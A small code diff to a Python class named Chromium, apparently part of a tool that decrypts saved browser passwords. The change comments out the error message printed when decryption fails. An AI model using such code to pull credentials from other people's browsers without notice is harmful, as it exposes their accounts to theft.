@@ -72,5 +72,5 @@ class Chromium():
             decrypted_pass = decrypted_pass.decode()
             return decrypted_pass
         except Exception as e:
-            print("[ERR] Unable to decrypt password")
+            #print("[ERR] Unable to decrypt password")
             return ""
